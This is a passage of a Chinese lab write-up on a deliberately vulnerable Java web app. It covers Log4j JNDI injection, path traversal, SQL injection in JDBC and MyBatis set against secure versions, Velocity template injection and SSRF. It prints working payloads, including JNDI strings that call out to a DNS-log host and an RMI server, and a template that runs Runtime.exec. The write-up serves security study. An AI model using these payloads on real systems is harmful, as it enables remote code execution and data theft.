class="hljs-comment">//使用 logger.error(token) 将用户输入写入日志。如果 Log4j 使用的是受影响版本，这里的 $&#123;jndi:ldap://...&#125; 将被解析执行，触发远程加载类，导致 RCE</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">log4j</span><span class="hljs-params">(String token)</span> &#123;<br>       logger.error(token);<br>       <span class="hljs-keyword">return</span> token;<br>   &#125;<br></code></pre></td></tr></table></figure><p>POC1:</p><p><code>/log4j?token=$&#123;jndi:ldap://$&#123;env:OS&#125;.44wodg.dnslog.cn&#125;</code></p><p><strong>直接访问会对非法字符过滤，需要 url 编码后注入</strong></p><p><code>/log4j?token=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Benv%3AOS%7D.44wodg.dnslog.cn%7D</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938049.png" alt="20250725141100248"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938015.png" alt="20250725141125185"></p><p>POC2:</p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot;</code></p><p><code>rmi://169.254.39.1:1099/ihe2v1</code></p><p><code>$&#123;jndi:rmi://169.254.39.1:1099/ihe2v1&#125;</code></p><p><code>/log4j?token=$&#123;jndi:rmi://169.254.39.1:1099/ihe2v1&#125;</code></p><p><code>url 编码：/log4j?token=%24%7Bjndi%3Armi%3A%2F%2F169.254.39.1%3A1099%2Fihe2v1%7D</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939169.png" alt="20250725141328166"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939335.png" alt="20250725141333552"></p><h2 id="PathTraversal"><a href="#PathTraversal" class="headerlink" title="PathTraversal"></a>PathTraversal</h2><p>没有对文件路径做任何过滤，攻击者可以访问任意文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939585.png" alt="20250725142845129"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939910.png" alt="20250725142909337"></p><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><h3 id="1-jdbc-vuln"><a href="#1-jdbc-vuln" class="headerlink" title="1.&#x2F;jdbc&#x2F;vuln"></a>1.&#x2F;jdbc&#x2F;vuln</h3><p>注入点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_sqli_vul</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>    ...<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>url:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/sqli/</span>jdbc/vuln?username=joycho<span class="hljs-string">u&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940681.png" alt="20250725132643238"></p><h3 id="2-jdbc-sec"><a href="#2-jdbc-sec" class="headerlink" title="2.&#x2F;jdbc&#x2F;sec"></a>2.&#x2F;jdbc&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/sec&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_sqli_sec</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>...<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = ?&quot;</span>;<br>    ...<br>&#125;    <br></code></pre></td></tr></table></figure><p>采用预编译，自动进行了转义，安全</p><h3 id="3-jdbc-ps-vuln"><a href="#3-jdbc-ps-vuln" class="headerlink" title="3.&#x2F;jdbc&#x2F;ps&#x2F;vuln"></a>3.&#x2F;jdbc&#x2F;ps&#x2F;vuln</h3><blockquote><p><code>PreparedStatement</code> 是 Java JDBC 提供的 <strong>预编译 SQL 语句执行器</strong>，用于安全执行 SQL 查询，<strong>防止 SQL 注入</strong>。</p><p><code>PreparedStatement</code> 是 <code>java.sql</code> 包中的一个接口，继承自 <code>Statement</code>。与普通的 <code>Statement</code> 相比，它可以使用 <code>?</code> 占位符来动态绑定参数，而不是直接拼接 SQL 字符串。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_ps_vuln</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>...<br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql);<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>错误使用 PreparedStatement , 虽然用的是 <code>PreparedStatement</code>，但 SQL 已拼接完成，还是有注入风险。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 正确使用范式 </span><br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql); <br>st.setString(<span class="hljs-number">1</span>,  username);  <span class="hljs-comment">// 参数绑定 </span><br></code></pre></td></tr></table></figure><p>url:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/sqli/</span>jdbc<span class="hljs-regexp">/ps/</span>vuln?username=joycho<span class="hljs-string">u&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940290.png" alt="20250725133408711"></p><h3 id="4-mybatis-vuln01"><a href="#4-mybatis-vuln01" class="headerlink" title="4.&#x2F;mybatis&#x2F;vuln01"></a>4.&#x2F;mybatis&#x2F;vuln01</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/vuln01&quot;)</span><br>   <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>       <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln01(username);<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span><br>List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln01</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/sqli/my</span>batis/vuln01?username=admin<span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>返回数据库中所有用户</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940609.png" alt="20250725134006587"></p><h3 id="5-mybatis-vuln02"><a href="#5-mybatis-vuln02" class="headerlink" title="5.&#x2F;mybatis&#x2F;vuln02"></a>5.&#x2F;mybatis&#x2F;vuln02</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/vuln02&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln02</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>        <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln02(username);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln02</span><span class="hljs-params">(String username)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln02&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>        select * from users where username like &#x27;%$&#123;_parameter&#125;%&#x27;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML 配置中拼接 like + <code>$&#123;&#125;</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">/sqli/mybatis/vuln02?username=<span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>-&gt;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span> OR <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940734.png" alt="20250725134316209"></p><h3 id="6-mybatis-orderby-vuln03"><a href="#6-mybatis-orderby-vuln03" class="headerlink" title="6.&#x2F;mybatis&#x2F;orderby&#x2F;vuln03"></a>6.&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/orderby/vuln03&quot;)</span><br>   <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln03</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span> &#123;<br>       <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln03(sort);<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln03</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;order&quot;)</span> String order)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln03&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>       select * from users<br>       <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;order != null&quot;</span>&gt;</span><br>           order by $&#123;order&#125; asc<br>       <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ORDER BY 拼接排序字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli/mybatis/orderby/vuln03?sort=id <span class="hljs-keyword">desc</span><span class="hljs-comment">--+</span><br>-&gt;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">desc</span><span class="hljs-comment">--+ asc</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940380.png" alt="20250725134556658"></p><h3 id="7-mybatis-sec01"><a href="#7-mybatis-sec01" class="headerlink" title="7.&#x2F;mybatis&#x2F;sec01"></a>7.&#x2F;mybatis&#x2F;sec01</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec01&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findByUserName(username);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br>User <span class="hljs-title function_">findByUserName</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br></code></pre></td></tr></table></figure><h3 id="8-mybatis-sec02"><a href="#8-mybatis-sec02" class="headerlink" title="8.&#x2F;mybatis&#x2F;sec02"></a>8.&#x2F;mybatis&#x2F;sec02</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec02&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec02</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;id&quot;)</span> Integer id)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findById(id);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">User <span class="hljs-title function_">findById</span><span class="hljs-params">(Integer id)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findById&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users where id = #&#123;id&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="9-mybatis-sec03"><a href="#9-mybatis-sec03" class="headerlink" title="9.&#x2F;mybatis&#x2F;sec03"></a>9.&#x2F;mybatis&#x2F;sec03</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec03&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec03</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.OrderByUsername();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">User <span class="hljs-title function_">OrderByUsername</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;OrderByUsername&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users order by id asc limit 1<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="10-mybatis-orderby-sec04"><a href="#10-mybatis-orderby-sec04" class="headerlink" title="10.&#x2F;mybatis&#x2F;orderby&#x2F;sec04"></a>10.&#x2F;mybatis&#x2F;orderby&#x2F;sec04</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/orderby/sec04&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisOrderBySec04</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln03(SecurityUtil.sqlFilter(sort));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln03</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;order&quot;)</span> String order)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln03&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users<br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;order != null&quot;</span>&gt;</span><br>        order by $&#123;order&#125; asc<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI（Server-Side Template Injection）就是服务器端模板注入</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941162.png" alt="20250726105655246"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/velocity&quot;)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">velocity</span><span class="hljs-params">(String template)</span> &#123;<br>       Velocity.init();<br><br>       <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br><br>       context.put(<span class="hljs-string">&quot;author&quot;</span>, <span class="hljs-string">&quot;Elliot A.&quot;</span>);<br>       context.put(<span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;217 E Broadway&quot;</span>);<br>       context.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;555-1337&quot;</span>);<br><br>       <span class="hljs-comment">//对用户传入的 template 无过滤直接传入 Velocity.evaluate 执行，</span><br>       <span class="hljs-type">StringWriter</span> <span class="hljs-variable">swOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>       Velocity.evaluate(context, swOut, <span class="hljs-string">&quot;test&quot;</span>, template);<br>   &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/ssti/velocity?template=#set($e=<span class="hljs-string">&quot;e&quot;</span>);$e.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,null).invoke(null,null).exec(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/ssti/velocity?template=%<span class="hljs-number">23</span>set($e=%<span class="hljs-number">22</span>e%<span class="hljs-number">22</span>);$e.getClass().forName(%<span class="hljs-number">22</span>java.lang.Runtime%<span class="hljs-number">22</span>).getMethod(%<span class="hljs-number">22</span>getRuntime%<span class="hljs-number">22</span>,null).invoke(null,null).exec(%<span class="hljs-number">22</span>calc.exe%<span class="hljs-number">22</span>)<br><br></code></pre></td></tr></table></figure><ol><li><code>#set($e=&quot;e&quot;)</code></li></ol><p>Velocity 模板语言中的变量定义。创建一个变量 <code>$e</code>，值为字符串 <code>&quot;e&quot;</code>。后面我们会用 <code>$e.getClass()</code> 来获取它的 <code>Class</code> 对象，从而进入 Java 反射</p><ol start="2"><li><code>$e.getClass()</code></li></ol><p><code>$e</code> 是字符串 <code>&quot;e&quot;</code>，调用 <code>.getClass()</code> 得到的是：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">java.lang.<span class="hljs-type">String</span>.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>得到了 <code>Class&lt;java.lang.String&gt;</code>，可以调用其 <code>forName()</code> 静态方法</p><ol start="3"><li><code>.forName(&quot;java.lang.Runtime&quot;)</code></li></ol><p>通过反射加载 <code>java.lang.Runtime</code> 类：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br></code></pre></td></tr></table></figure><p>返回 <code>java.lang.Runtime.class</code>，可以继续调用它的方法</p><ol start="4"><li><code>.getMethod(&quot;getRuntime&quot;, null)</code></li></ol><p>获取 <code>Runtime</code> 类的静态方法 <code>getRuntime()</code>：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span>.<span class="hljs-keyword">class</span>.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>)<br></code></pre></td></tr></table></figure><p><code>getMethod()</code> 返回一个 <code>Method</code> 对象，准备执行它</p><ol start="5"><li><code>.invoke(null, null)</code></li></ol><p>执行静态方法 <code>getRuntime()</code>：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span>.getRuntime()<br></code></pre></td></tr></table></figure><p>得到了当前 JVM 的 <code>Runtime</code> 实例，具备执行命令的能力</p><ol start="6"><li><code>.exec(&quot;calc.exe&quot;)</code></li></ol><p>最终执行命令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br></code></pre></td></tr></table></figure><p>在 Windows 上，打开计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941658.png" alt="20250726105045484"></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p><img src="https://gitee.com/xvshifu/pic-go/raw/master/img/20250726112359849.png" alt="image-20250726112359793"></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">URLConnectionVuln</span><span class="hljs-params">(String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> HttpUtils.URLConnection(url);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">URLConnection</span><span class="hljs-params">(String url)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//没有校验协议和主机，对任意协议都可以访问</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>        <span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> u.openConnection();<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(urlConnection.getInputStream())); <span class="hljs-comment">//send request</span><br>        String inputLine;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span 